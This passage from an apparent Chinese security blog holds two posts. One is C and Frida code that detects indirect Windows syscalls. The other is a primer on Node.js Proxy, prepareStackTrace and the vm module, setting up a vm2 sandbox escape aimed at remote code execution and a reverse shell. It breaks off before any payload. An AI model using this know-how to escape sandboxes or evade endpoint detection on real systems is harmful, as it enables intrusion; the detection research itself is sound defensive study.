<p><img src="/posts/973bd040/4.png" alt="img"></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> modules = <span class="title class_">Process</span>.<span class="title function_">enumerateModules</span>()</span><br><span class="line"><span class="keyword">var</span> ntdll = modules[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ntdllBase = ntdll.<span class="property">base</span></span><br><span class="line"><span class="title function_">send</span>(<span class="string">&quot;[*] Ntdll base: &quot;</span> + ntdllBase)</span><br><span class="line"><span class="keyword">var</span> ntdllOffset = ntdllBase.<span class="title function_">add</span>(ntdll.<span class="property">size</span>)</span><br><span class="line"><span class="title function_">send</span>(<span class="string">&quot;[*] Ntdll end: &quot;</span> + ntdllOffset)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> mainThread = <span class="title class_">Process</span>.<span class="title function_">enumerateThreads</span>()[<span class="number">0</span>];</span><br><span class="line"><span class="title class_">Process</span>.<span class="title function_">enumerateThreads</span>().<span class="title function_">map</span>(<span class="function"><span class="params">t</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="title class_">Stalker</span>.<span class="title function_">follow</span>(t.<span class="property">id</span>, &#123;</span><br><span class="line">    <span class="attr">events</span>: &#123;</span><br><span class="line">      <span class="attr">call</span>: <span class="literal">false</span>, <span class="comment">// CALL instructions: yes please</span></span><br><span class="line">      <span class="comment">// Other events:</span></span><br><span class="line">      <span class="attr">ret</span>: <span class="literal">false</span>, <span class="comment">// RET instructions</span></span><br><span class="line">      <span class="attr">exec</span>: <span class="literal">false</span>, <span class="comment">// all instructions: not recommended as it&#x27;s</span></span><br><span class="line">      <span class="comment">//                   a lot of data</span></span><br><span class="line">      <span class="attr">block</span>: <span class="literal">false</span>, <span class="comment">// block executed: coarse execution trace</span></span><br><span class="line">      <span class="attr">compile</span>: <span class="literal">false</span> <span class="comment">// block compiled: useful for coverage</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">onReceive</span>(<span class="params">events</span>) &#123;    </span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">transform</span>(<span class="params">iterator</span>)&#123;</span><br><span class="line">      <span class="keyword">let</span> instruction = iterator.<span class="title function_">next</span>()</span><br><span class="line">      <span class="keyword">do</span>&#123;</span><br><span class="line">        <span class="comment">//I think this reduces overhead</span></span><br><span class="line">        <span class="keyword">if</span>(instruction.<span class="property">mnemonic</span> == <span class="string">&quot;mov&quot;</span>)&#123;</span><br><span class="line">          <span class="comment">//Should provide a good filter for syscalls, might need further filtering</span></span><br><span class="line">          <span class="keyword">if</span>(instruction.<span class="title function_">toString</span>() == <span class="string">&quot;mov r10, rcx&quot;</span>)&#123;</span><br><span class="line">            iterator.<span class="title function_">keep</span>() <span class="comment">//keep the instruction</span></span><br><span class="line">            instruction = iterator.<span class="title function_">next</span>() <span class="comment">//next instruction should have the syscall number</span></span><br><span class="line">            <span class="comment">//This helps to clear up some false positives</span></span><br><span class="line">            <span class="keyword">if</span>(instruction.<span class="title function_">toString</span>().<span class="title function_">split</span>(<span class="string">&#x27;,&#x27;</span>)[<span class="number">0</span>] == <span class="string">&quot;mov eax&quot;</span>)&#123;</span><br><span class="line">              <span class="keyword">var</span> addrInt = instruction.<span class="property">address</span>.<span class="title function_">toInt32</span>()</span><br><span class="line">              <span class="comment">//If the syscall is coming from somewhere outside the bounds of NTDLL</span></span><br><span class="line">              <span class="comment">//then it may be malicious</span></span><br><span class="line">              <span class="keyword">if</span>(addrInt &lt; ntdllBase.<span class="title function_">toInt32</span>() || addrInt &gt; ntdllOffset.<span class="title function_">toInt32</span>())&#123;</span><br><span class="line">                <span class="title function_">send</span>(<span class="string">&quot;[+] Found a potentially malicious syscall: &quot;</span> + instruction.<span class="title function_">toString</span>())</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        iterator.<span class="title function_">keep</span>()</span><br><span class="line">      &#125; <span class="keyword">while</span> ((instruction = iterator.<span class="title function_">next</span>()) !== <span class="literal">null</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<h4 id="HWBP"><a href="#HWBP" class="headerlink" title="HWBP"></a>HWBP</h4><p>在syscall/ret 处设置一个硬件断点， 将间接系统调用 用 call/jmp 到我们的指令。</p>
<p>如果它来自 kernel32、kernelbase 说明是一个合法函数 否则为非法syscall</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//https://fool.ish.wtf/2022/11/detecting-indirect-syscalls.html</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;c_syscalls.h&quot;</span> <span class="comment">// janoglezcampos/c_syscalls</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SINGLE_STEP_COUNT 2</span></span><br><span class="line"></span><br><span class="line"><span class="type">uintptr_t</span> k32_h;</span><br><span class="line"><span class="type">uintptr_t</span> kb_h;</span><br><span class="line">DWORD k32_s;</span><br><span class="line">DWORD kb_s;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uintptr_t</span> <span class="title">find_gadget</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ <span class="type">const</span> <span class="type">uintptr_t</span> function,</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ <span class="type">const</span> BYTE* stub,</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ <span class="type">const</span> UINT size</span></span></span><br><span class="line"><span class="params"><span class="function">)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">25u</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">memcmp</span>((LPVOID)(function + i), stub, size) == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> (function + i);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">set_hardware_breakpoint</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ <span class="type">const</span> DWORD tid,</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ <span class="type">const</span> <span class="type">uintptr_t</span> address,</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ <span class="type">const</span> UINT pos,</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ <span class="type">const</span> BOOL init</span></span></span><br><span class="line"><span class="params"><span class="function">)</span> </span>&#123;</span><br><span class="line">	CONTEXT context = &#123; .ContextFlags = CONTEXT_DEBUG_REGISTERS &#125;;</span><br><span class="line"></span><br><span class="line">	HANDLE thd = INVALID_HANDLE_VALUE;</span><br><span class="line"></span><br><span class="line">	BOOL res = FALSE;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (tid == <span class="built_in">GetCurrentThreadId</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		thd = <span class="built_in">GetCurrentThread</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		thd = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, FALSE, tid);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	res = <span class="built_in">GetThreadContext</span>(thd, &amp;context);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (init &amp;&amp; res)</span><br><span class="line">	&#123;</span><br><span class="line">		(&amp;context.Dr0)[pos] = address;</span><br><span class="line">		context.Dr7 &amp;= ~(<span class="number">3ull</span> &lt;&lt; (<span class="number">16</span> + <span class="number">4</span> * pos));</span><br><span class="line">		context.Dr7 &amp;= ~(<span class="number">3ull</span> &lt;&lt; (<span class="number">18</span> + <span class="number">4</span> * pos));</span><br><span class="line">		context.Dr7 |= <span class="number">1ull</span> &lt;&lt; (<span class="number">2</span> * pos);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ((&amp;context.Dr0)[pos] == address)</span><br><span class="line">		&#123;</span><br><span class="line">			context.Dr7 &amp;= ~(<span class="number">1ull</span> &lt;&lt; (<span class="number">2</span> * pos));</span><br><span class="line">			(&amp;context.Dr0)[pos] = <span class="number">0ull</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	res = <span class="built_in">SetThreadContext</span>(thd, &amp;context);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (thd != INVALID_HANDLE_VALUE) <span class="built_in">CloseHandle</span>(thd);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">LONG WINAPI <span class="title">exception_handler</span><span class="params">(<span class="type">const</span> PEXCEPTION_POINTERS ExceptionInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == STATUS_SINGLE_STEP)</span><br><span class="line"></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">static</span>  <span class="type">unsigned</span> <span class="type">short</span> count = SINGLE_STEP_COUNT;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			ExceptionInfo-&gt;ContextRecord-&gt;EFlags |= <span class="number">1</span> &lt;&lt; <span class="number">8</span>; <span class="comment">// TF</span></span><br><span class="line">			count--;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;[%u] syscall -&gt; ret -&gt; 0x%p\n&quot;</span>, count, (PVOID)ExceptionInfo-&gt;ContextRecord-&gt;Rip);</span><br><span class="line"></span><br><span class="line">			<span class="type">uintptr_t</span> address = ExceptionInfo-&gt;ContextRecord-&gt;Rip;</span><br><span class="line"></span><br><span class="line">			BOOL legit = FALSE;</span><br><span class="line"></span><br><span class="line">			<span class="comment">// syscall -&gt; ret -&gt; ...</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (address &gt;= k32_h &amp;&amp; address &lt;= k32_h + k32_s || address &gt;= kb_h &amp;&amp; address &lt;= kb_h + kb_s)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">// check opcode is not ret opcode</span></span><br><span class="line">				<span class="type">char</span> opcode = *(<span class="type">char</span>*)ExceptionInfo-&gt;ContextRecord-&gt;Rip;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (opcode != <span class="number">0xC3</span> &amp;&amp; opcode != <span class="number">0xCB</span> &amp;&amp; opcode != <span class="number">0xC2</span> &amp;&amp; opcode != <span class="number">0xCA</span>)</span><br><span class="line">					legit = TRUE;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\n[+] %s SYSCALL DETECTED\n\n&quot;</span>, legit ? <span class="string">&quot;LEGIT&quot;</span> : <span class="string">&quot;INDIRECT&quot;</span>);</span><br><span class="line"></span><br><span class="line">			count = SINGLE_STEP_COUNT;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ExceptionInfo-&gt;ContextRecord-&gt;EFlags |= <span class="number">1</span> &lt;&lt; <span class="number">16</span>; <span class="comment">// RF</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">test_thread</span><span class="params">(_In_ LPVOID lpParameter)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uintptr_t</span> <span class="title">set_module_values</span><span class="params">(_In_ <span class="type">uintptr_t</span> <span class="keyword">module</span>, _Out_ DWORD* size)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(<span class="keyword">module</span> + ((PIMAGE_DOS_HEADER)<span class="keyword">module</span>)-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="type">const</span> PIMAGE_SECTION_HEADER section = (PIMAGE_SECTION_HEADER)((DWORD_PTR)<span class="built_in">IMAGE_FIRST_SECTION</span>(nt) + (DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ((*(ULONG*)section-&gt;Name | <span class="number">0x20202020</span>) == <span class="string">&#x27;xet.&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">			ULONG dw;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">module</span> = <span class="keyword">module</span> + section-&gt;VirtualAddress;</span><br><span class="line"></span><br><span class="line">			*size = section-&gt;Misc.VirtualSize;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">module</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Register our exception handler</span></span><br><span class="line"></span><br><span class="line">	<span class="type">const</span> PVOID handler = <span class="built_in">AddVectoredExceptionHandler</span>(<span class="number">1</span>, exception_handler);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Set the global values of the DLL .text sections VA and SZ</span></span><br><span class="line"></span><br><span class="line">	k32_h = <span class="built_in">set_module_values</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;KERNEL32.dll&quot;</span>), &amp;k32_s);</span><br><span class="line"></span><br><span class="line">	kb_h = <span class="built_in">set_module_values</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;KERNELBASE.dll&quot;</span>), &amp;kb_s);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Find address to breakpoint on and set it.</span></span><br><span class="line"></span><br><span class="line">	<span class="type">const</span> <span class="type">uintptr_t</span> syscall_address1 = <span class="built_in">find_gadget</span>(<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;NTDLL.dll&quot;</span>), <span class="string">&quot;NtTestAlert&quot;</span>), <span class="string">&quot;\x0F\x05&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">set_hardware_breakpoint</span>(<span class="built_in">GetCurrentThreadId</span>(), syscall_address1, <span class="number">1</span>, TRUE);</span><br><span class="line"></span><br><span class="line">	<span class="type">const</span> <span class="type">uintptr_t</span> syscall_address2 = <span class="built_in">find_gadget</span>(<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;NTDLL.dll&quot;</span>), <span class="string">&quot;NtCreateThreadEx&quot;</span>), <span class="string">&quot;\x0F\x05&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">set_hardware_breakpoint</span>(<span class="built_in">GetCurrentThreadId</span>(), syscall_address2, <span class="number">2</span>, TRUE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Test cases</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[-] Testing indirect syscall.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	NTSTATUS status = <span class="built_in">Syscall</span>(NT_TEST_ALERT);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[-] Testing legitimate syscall.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">const</span> HANDLE t = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, test_thread, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (t) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">WaitForSingleObject</span>(t, INFINITE); <span class="built_in">CloseHandle</span>(t);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Disable the hardware breakpoint</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">set_hardware_breakpoint</span>(<span class="built_in">GetCurrentThreadId</span>(), syscall_address1, <span class="number">1</span>, FALSE);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">set_hardware_breakpoint</span>(<span class="built_in">GetCurrentThreadId</span>(), syscall_address2, <span class="number">2</span>, FALSE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Remove our registered VEH</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (handler != <span class="literal">NULL</span>) <span class="built_in">RemoveVectoredExceptionHandler</span>(handler);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://winternl.com/detecting-manual-syscalls-from-user-mode/">https://winternl.com/detecting-manual-syscalls-from-user-mode/</a></p>
<p><a href="https://pre.empt.blog/2022/implementing-syscall-detection-into-fennec">https://pre.empt.blog/2022/implementing-syscall-detection-into-fennec</a>  </p>
<p><a href="https://www.codeproject.com/Articles/543542/Windows-x64-system-service-hooks-and-advanced-debu">https://www.codeproject.com/Articles/543542/Windows-x64-system-service-hooks-and-advanced-debu</a></p>
<p><a href="https://passthehashbrowns.github.io/detecting-direct-syscalls-with-frida">https://passthehashbrowns.github.io/detecting-direct-syscalls-with-frida</a></p>
]]></content>
      <categories>
        <category>syscall</category>
      </categories>
      <tags>
        <tag>syscall</tag>
      </tags>
  </entry>
  <entry>
    <title>nodejs下vm2沙箱逃逸</title>
    <url>/posts/bfeb5984/</url>
    <content><![CDATA[<p>node.js  运行在服务端的JavaScript，是一个基于Chrome JavaScript运行时建立的平台，基于Google V8引擎。</p>
<p>vm2沙箱 是一个独立 的环境，主要运行一些不受信任的代码，以减轻恶意代码影响运行代码的主机的风险。虽然沙箱作为隔离机制非常有用，但是需要谨慎使用，因为 存在一些沙箱逃逸可以绕过这些限制。vm2 未处理的异步错误时不能正确地传递参数给 Error.pareStackTrace的对象（sst）造成沙箱绕过，从而造成远程代码执行</p>
<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>之前没学习过js 其中es6这块也更是没听说过 所以在直接看代码的时候有比较大的困惑，后面看了下一些相关文档，主要记录几个下面会用得到的东西</p>
<h4 id="JavaScript相关"><a href="#JavaScript相关" class="headerlink" title="JavaScript相关"></a>JavaScript相关</h4><h5 id="let-var-const"><a href="#let-var-const" class="headerlink" title="let/var/const"></a>let/var/const</h5><p>let 块级作用域 函数内部使用let定义后 对函数外部无影响</p>
<p>var 定义的变量可以修改 如果不初始化会输出undefined 但不会报错</p>
<p>const 定义的变量不可修改 且必须初始化</p>
<p>es6中 const的简写</p>
<p>const {xxx} = this.state   =&gt;   const xxx = this.state.xxx</p>
<p>const {aaa,bbb,ccc} =&gt;  this const aaa = this.aaa  const bbb = this.bbb const ccc =this.ccc</p>
<p>const {aaa:A , bbb:B } = this  ？=&gt;   const A = this.aaa const B = this.B</p>
<p>async 异步操作相关关键字</p>
<p>await只能在以不含税async function内部使用</p>
<p>async函数中可能会有await表达式，如果在async函数执行时，遇到await后回显暂停执行，等触发的异步操作完成后，恢复async函数的执行并返回解析值</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>)&#123;  </span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;1&quot;</span>)  </span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">a</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"><span class="comment">//打印： 1 2 3 </span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>)&#123;  </span><br><span class="line">  <span class="keyword">await</span> <span class="number">1</span>  </span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;1&quot;</span>)  </span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">a</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"><span class="comment">//打印： 3 1 2</span></span><br></pre></td></tr></table></figure>

<h5 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h5><p>Proxy 是对象的包装，将代理上的操作转发到对象，并可以选择捕获其中的一些操作，可以包装任何类型的对象，包括类和函数。</p>
<p>语法： <code>let proxy = new Proxy(target, handle)</code></p>
<ul>
<li>target    要包装的对象，可以是任何东西，包括函数</li>
<li>handle    代理配置：带有”钩子”的对象  比如get钩子用于读取target属性 set钩子用于写入target属性</li>
</ul>
<p>e.g.</p>
<p>创建一个没有任何钩子的代理</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> target = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> proxy = <span class="keyword">new</span> <span class="title class_">Proxy</span> (target,&#123;&#125;);  <span class="comment">//空的handler对象</span></span><br><span class="line">proxy.<span class="property">test</span> = <span class="number">5</span>; <span class="comment">//写入proxy对象</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(target.<span class="property">test</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(proxy.<span class="property">test</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> key <span class="keyword">in</span> proxy) <span class="variable language_">console</span>.<span class="title function_">log</span>(key)</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bfeb5984/1.png" alt="img"></p>
<p>在没有钩子情况下 所以对proxy的操作都会转发给target</p>
<ul>
<li>1.写入操作 proxy.test 会将值写入 target</li>
<li>2.读取操作 proxy.test 会从target 返回对应的值</li>
<li>3.迭代proxy 会从 target 返回对应的值2</li>
</ul>
<p>在没有任何钩子情况下，proxy是一个target的透明包装</p>
<p>target下的一些内部方法 图片来源及参考： <a href="https://juejin.cn/post/6844904090116292616">https://juejin.cn/post/6844904090116292616</a></p>
<p><img src="/posts/bfeb5984/2.png" alt="img"></p>
<h6 id="Get钩子"><a href="#Get钩子" class="headerlink" title="Get钩子"></a>Get钩子</h6><p>参考 <a href="https://juejin.cn/post/6844904090116292616">https://juejin.cn/post/6844904090116292616</a></p>
<p>利用proxy 中的 Get钩子 主要用于读取target 属性，当读取属性性会触发该方法</p>
<p>get(target, property, receiver)</p>
<ul>
<li>target    目标对象，该对象第一个参数传递给 new proxy</li>
<li>property    目标属性名</li>
<li>received    如果目标属性是一个getter访问器属性，则 received就是本次读取属性所在的对象。通常是proxy对象本身，可以不需要该参数</li>
</ul>
<p>使用get实现对象的默认值</p>
<p>通常情况下在nodejs获取不存在的数组项是将会得到 <code>undefined</code>，而我们将常规数组包装到代理中，以捕获读取操作 在没有此类属性的情况下返回为 <code>0</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> nums = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">nums = <span class="keyword">new</span> <span class="title class_">Proxy</span>(nums, &#123;</span><br><span class="line">    <span class="title function_">get</span>(<span class="params">target,prop</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (prop <span class="keyword">in</span> target)&#123;</span><br><span class="line">            <span class="keyword">return</span> target[prop]</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(nums[<span class="number">1</span>])</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(nums[<span class="number">10</span>])    </span><br></pre></td></tr></table></figure>

<p><img src="/posts/bfeb5984/3.png" alt="img"></p>
<h5 id="prepareStackTrace-自定义异常"><a href="#prepareStackTrace-自定义异常" class="headerlink" title="prepareStackTrace  自定义异常"></a>prepareStackTrace  自定义异常</h5><p>[<a href="https://www.bookstack.cn/read/node-in-debugging/3.3ErrorStack.md#3.3.4%20Error.prepareStackTrace]">https://www.bookstack.cn/read/node-in-debugging/3.3ErrorStack.md#3.3.4%20Error.prepareStackTrace]</a>(<a href="https://www.bookstack.cn/read/node-in-debugging/3.3ErrorStack.md#3.3.4">https://www.bookstack.cn/read/node-in-debugging/3.3ErrorStack.md#3.3.4</a> Error.prepareStackTrace)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Error.prepareStackTrace(error, structuredStackTrace)</span><br></pre></td></tr></table></figure>

<ul>
<li>第一个参数是 error对象</li>
<li>第二个参数是一个数组</li>
</ul>
<p>Error.prepareStackTrace = function (error, callSites){ }</p>
<h4 id="node-js下漏洞利用"><a href="#node-js下漏洞利用" class="headerlink" title="node.js下漏洞利用"></a>node.js下漏洞利用</h4><h4 id="child-process"><a href="#child-process" class="headerlink" title="child_process"></a>child_process</h4><p>node.js可以利用child_process模块创建子进程执行一些命令 </p>
<p>反弹shell</p>
<h3 id="VM-API"><a href="#VM-API" class="headerlink" title="VM API"></a>VM API</h3><p>以文档中的实例为例  vm运行沙箱的过程：</p>
<p>编译一段代码 -&gt; 创建一个上下文隔离对象 -&gt; 在沙箱中运行代码并返回结果 </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> context = &#123;</span><br><span class="line">  <span class="attr">animal</span>: <span class="string">&#x27;cat&#x27;</span>,</span><br><span class="line">  <span class="attr">count</span>: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(<span class="string">&#x27;count += 1; name = &quot;kitty&quot;;&#x27;</span>); <span class="comment">//编译code</span></span><br><span class="line"></span><br><span class="line">vm.<span class="title function_">createContext</span>(context); <span class="comment">// 创建一个上下文隔离对象</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">  script.<span class="title function_">runInContext</span>(context); <span class="comment">// 在指定的下文里执行code并返回其结果</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(context);</span><br><span class="line"><span class="comment">// 打印: &#123; animal: &#x27;cat&#x27;, count: 12, name: &#x27;kitty&#x27; &#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>vm.createContext([sandbox])</strong></li>
</ul>
<p>在使用前需要先创建一个沙箱对象，在将沙箱对象传给该方法「如果没有则会生成一个空的沙箱对象」v8为这个沙箱对象在*<strong>当前的global外再创建一个作用域*<strong>，此时这个沙箱对象就是这个作用域中的全局对象，</strong>沙箱内部无法访问global中的属性</strong>。</p>
<ul>
<li><strong>vm.runInThisContext(code)</strong> </li>
</ul>
<p>在当前global下创建一个作用域(sandbox) 并将接收到的参数当做代码运行。在sandbox中可以访问到global中的属性，但无法访问其他包的属性</p>
<ul>
<li><strong>vm.runInNewContext(code[,sandbox][,options])</strong> </li>
</ul>
<p>createContext和runInThisContext的结合版  参数为传入要执行的代码和沙箱对象</p>
<ul>
<li><strong>vm.Script类</strong></li>
</ul>
<p>vm.Script类型的实力包含若干预编译的脚本，这些脚本能够在特定的沙箱或者上下文中被运行</p>
<ul>
<li><strong>new vm.Script(code, options)</strong> </li>
</ul>
<p>创建一个新的vm.Script对象  只编译代码但不会执行。  编译过的vm.Script之后可以多次被执行    code参数只绑定于每次执行它的对象</p>
<ul>
<li>注： 对于一些code参数的代码 一般都使用 ````反引号进行包裹</li>
<li>vm模块详细可参考以下：</li>
<li><a href="https://nodejs.cn/api/vm.html">https://nodejs.cn/api/vm.html</a> </li>
<li><a href="https://www.mianshigee.com/note/detail/27897wlr">https://www.mianshigee.com/note/detail/27897wlr</a></li>
